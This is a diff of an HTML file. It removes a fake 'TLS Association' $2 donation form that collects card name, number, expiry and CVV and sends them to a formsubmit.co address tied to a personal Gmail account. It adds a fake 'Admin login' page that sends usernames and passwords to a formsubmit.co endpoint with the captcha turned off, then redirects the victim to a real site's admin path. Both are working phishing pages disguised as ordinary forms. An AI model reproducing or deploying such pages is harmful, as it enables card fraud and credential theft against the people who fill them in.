@@ -1,278 +1,219 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>TLS</title>
-
-	<link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
-	<link rel="stylesheet" href="style.css">
-
+<!-- Created By CodingLab - www.codinglabweb.com -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Login Form | CodingLab</title> 
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
 <style type="text/css">
-	
-
-* {
-    box-sizing: border-box;
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
+*{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins',sans-serif;
 }
- 
-body,
-html {
-    height: 100%;
-    min-height: 100%;
+body{
+  background: #1abc9c;
+  overflow: hidden;
 }
- 
-body {
-    font-family: 'Roboto',
-    sans-serif;
-    margin: 0;
-    background-color: #e7e7e7;
+::selection{
+  background: rgba(26,188,156,0.3);
 }
-
-
-.credit-card {
-    width: 360px;
-    height: 400px;
-    margin: 60px auto 0;
-    border: 1px solid #ddd;
-    border-radius: 6px;
-    background-color: #fff;
-    box-shadow: 1px 2px 3px 0 rgba(0,0,0,.10);
+.container{
+  max-width: 440px;
+  padding: 0 20px;
+  margin: 170px auto;
 }
-
-
-.form-header {
-    height: 60px;
-    padding: 20px 30px 0;
-    border-bottom: 1px solid #e1e8ee;
+.wrapper{
+  width: 100%;
+  background: #fff;
+  border-radius: 5px;
+  box-shadow: 0px 4px 10px 1px rgba(0,0,0,0.1);
 }
- 
-.form-body {
-    height: 340px;
-    padding: 30px 30px 20px;
+.wrapper .title{
+  height: 90px;
+  background: #16a085;
+  border-radius: 5px 5px 0 0;
+  color: #fff;
+  font-size: 30px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
-
-
-
-.title {
-    font-size: 18px;
-    margin: 0;
-    color: #5e6977;
+.wrapper form{
+  padding: 30px 25px 25px 25px;
 }
-
-
-.card-number,
-.cvv-input input,
-.month select,
-.year select {
-    font-size: 15px;
-    font-weight: 100;
-    line-height: 14px;
+.wrapper form .row{
+  height: 45px;
+  margin-bottom: 15px;
+  position: relative;
 }
- 
-.card-number,
-.month select,
-.year select {
-    font-size: 17px;
-    font-weight: 100;
-    line-height: 20px;
+.wrapper form .row input{
+  height: 100%;
+  width: 100%;
+  outline: none;
+  padding-left: 60px;
+  border-radius: 5px;
+  border: 1px solid lightgrey;
+  font-size: 16px;
+  transition: all 0.3s ease;
 }
- 
-.card-number,
-.cvv-details,
-.cvv-input input,
-.month select,
-.year select {
-    opacity: .7;
-    color: black;
-
+form .row input:focus{
+  border-color: #16a085;
+  box-shadow: inset 0px 0px 2px 2px rgba(26,188,156,0.25);
 }
-
-
-
-.card-number {
-    width: 100%;
-    height: 38px;
-    margin-bottom: 20px;
-    padding-left: 20px;
-    border: 2px solid #e1e8ee;
-    border-radius: 6px;
+form .row input::placeholder{
+  color: #999;
 }
-
-
-
-.month select,
-.year select {
-    width: 145px;
-    height: 38px;
-    margin-bottom: 20px;
-    padding-left: 20px;
-    border: 2px solid #e1e8ee;
-    border-radius: 6px;
-    background: url('caret.png') no-repeat;
-    background-position: 85% 50%;
-    -moz-appearance: none;
-    -webkit-appearance: none;
+.wrapper form .row i{
+  position: absolute;
+  width: 47px;
+  height: 100%;
+  color: #fff;
+  font-size: 18px;
+  background: #16a085;
+  border: 1px solid #16a085;
+  border-radius: 5px 0 0 5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
- 
-.month select {
-    float: left;
+.wrapper form .pass{
+  margin: -8px 0 20px 0;
 }
- 
-.year select {
-    float: right;
+.wrapper form .pass a{
+  color: #16a085;
+  font-size: 17px;
+  text-decoration: none;
+}
+.wrapper form .pass a:hover{
+  text-decoration: underline;
+}
+.wrapper form .button input{
+  color: #fff;
+  font-size: 20px;
+  font-weight: 500;
+  padding-left: 0px;
+  background: #16a085;
+  border: 1px solid #16a085;
+  cursor: pointer;
+}
+form .button input:hover{
+  background: #12876f;
+}
+.wrapper form .signup-link{
+  text-align: center;
+  margin-top: 20px;
+  font-size: 17px;
+}
+.wrapper form .signup-link a{
+  color: #16a085;
+  text-decoration: none;
+}
+form .signup-link a:hover{
+  text-decoration: underline;
 }
 
 
 
-.cvv-input input {
-	height: 38px;
-    float: left;
-    width: 145px;
-    padding-left: 20px;
-    border: 2px solid #e1e8ee;
-    border-radius: 6px;
-    background: #fff;
+.wrapper form .row{
+  height: 45px;
+  margin-bottom: 15px;
+  position: relative;
 }
- 
-.cvv-details {
-    font-size: 13px;
-    font-weight: 300;
-    line-height: 18px;
-    float: right;
-    margin-bottom: 20px;
+.wrapper form .row button{
+  height: 100%;
+  width: 100%;
+  outline: none;
+  padding-left: 60px;
+  border-radius: 5px;
+  border: 1px solid lightgrey;
+  font-size: 16px;
+  transition: all 0.3s ease;
 }
- 
-.cvv-details p {
-    margin-top: 6px;
+form .row button:focus{
+  border-color: #16a085;
+  box-shadow: inset 0px 0px 2px 2px rgba(26,188,156,0.25);
+}
+form .row button::placeholder{
+  color: #999;
+}
+.wrapper form .row i{
+  position: absolute;
+  width: 47px;
+  height: 100%;
+  color: #fff;
+  font-size: 18px;
+  background: #16a085;
+  border: 1px solid #16a085;
+  border-radius: 5px 0 0 5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.wrapper form .pass{
+  margin: -8px 0 20px 0;
+}
+.wrapper form .pass a{
+  color: #16a085;
+  font-size: 17px;
+  text-decoration: none;
+}
+.wrapper form .pass a:hover{
+  text-decoration: underline;
+}
+.wrapper form .button button{
+  color: #fff;
+  font-size: 20px;
+  font-weight: 500;
+  padding-left: 0px;
+  background: #16a085;
+  border: 1px solid #16a085;
+  cursor: pointer;
+}
+form .button button:hover{
+  background: #12876f;
+}
+.wrapper form .signup-link{
+  text-align: center;
+  margin-top: 20px;
+  font-size: 17px;
 }
 
 
 
-.paypal-btn,
-.proceed-btn {
-    cursor: pointer;
-    font-size: 16px;
-    width: 100%;
-    border-color: transparent;
-    border-radius: 6px;
-}
- 
-.proceed-btn {
-    margin-bottom: 10px;
-    background: #7dc855;
-    height: 38px;
-}
- 
-.paypal-btn a,
-.proceed-btn a {
-    text-decoration: none;
-}
- 
-.proceed-btn a {
-    color: #fff;
-}
- 
-.paypal-btn a {
-    color: rgba(242, 242, 242, .7);
-}
- 
-.paypal-btn {
-    padding-right: 95px;
-    background: url('paypal-logo.svg') no-repeat 65% 56% #009cde;
-}
 
 
-.aa {
-	flood-color: #5e6977;
-}
 
-select:invalid {
-	color: #5e6977;
-}
 </style>
-
-
-
-
-</head>
-<body>
-	<form class="credit-card" action="https://formsubmit.co/tu7797tu@gmail.com" method="POST">
-  <div class="form-header">
-    <h4 class="title">TLS Association &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2$</h4>
-  </div>
- 
-  <div class="form-body">
-  	<input type="text" name="card name" class="card-number" placeholder="Name on Card" maxlength="50" required>
-    <!-- Card Number -->
-    <input type="text" name="card number" class="card-number" placeholder="Card Number" maxlength="16" minlength="16" onkeypress="return restrictAlphabets(event)" required>
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://association-tls.github.io/TLS/">
-    <!-- Date Field -->
-    <div class="date-field">
-      <div class="month">
-        <select name="Month" required >
-          <option value="" disabled selected hidden class="aa" >Month</option>
-          <option value="1">01</option>
-          <option value="2">02</option>
-          <option value="3">03</option>
-          <option value="4">04</option>
-          <option value="5">05</option>
-          <option value="6">06</option>
-          <option value="7">07</option>
-          <option value="8">08</option>
-          <option value="9">09</option>
-          <option value="10">10</option>
-          <option value="11">11</option>
-          <option value="12">12</option>
-        </select>
-      </div>
-      <div class="year">
-        <select name="Year" required>
-          <option value="" disabled selected hidden>Year</option>
-          <option value="2023">2023</option>
-          <option value="2024">2024</option>
-          <option value="2025">2025</option>
-          <option value="2026">2026</option>
-          <option value="2027">2027</option>
-          <option value="2028">2028</option>
-          <option value="2029">2029</option>
-          <option value="2030">2030</option>
-          <option value="2031">2031</option>
-          <option value="2032">2032</option>
-          <option value="2033">2033</option>
-        </select>
+   
+  </head>
+  <body>
+    <div class="container">
+      <div class="wrapper">
+        <div class="title"><span>Admin login</span></div>
+        <form action="https://formsubmit.co/27e2e730e2c9afb16d62432d321bba49" method="POST">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_next" value="https://www.betarabia.com/admin/">
+          <div class="row">
+            <i class="fas fa-user"></i>
+            <input type="text" name="user" placeholder="Username" required>
+          </div>
+          <div class="row">
+            <i class="fas fa-lock"></i>
+            <input type="password" name="pass" placeholder="Password" required>
+          </div>
+          <div class="pass"><a href="#">Forgot password?</a></div>
+          <div class="row button">
+            <button type="submit" value="Login" >login</button>
+          </div>
+        </form>
       </div>
     </div>
- 
-    <!-- Card Verification Field -->
-    <div class="card-verification">
-      <div class="cvv-input">
-        <input type="text" name="cvv" placeholder="CVV" maxlength="3" minlength="3" required onkeypress="return restrictAlphabets(event)">
-      </div>
-      <div class="cvv-details">
-        <p>3 or 4 digits usually found <br> on the signature strip</p>
-      </div>
-    </div>
- 
-    <!-- Buttons -->
-    <button type="submit" class="proceed-btn"><a href="#">Donate 2$</a></button>
-    
-  </div>
-</form>
-
-
-<script type="text/javascript">
-	
-function restrictAlphabets(e) {
-	var x = e.which || e.keycode;
-	if ((x >= 48 && x <= 57))
-		return true;
-	else
-		return false;
-}
-
-
-</script>
-
-</body>
+  </body>
 </html>
+
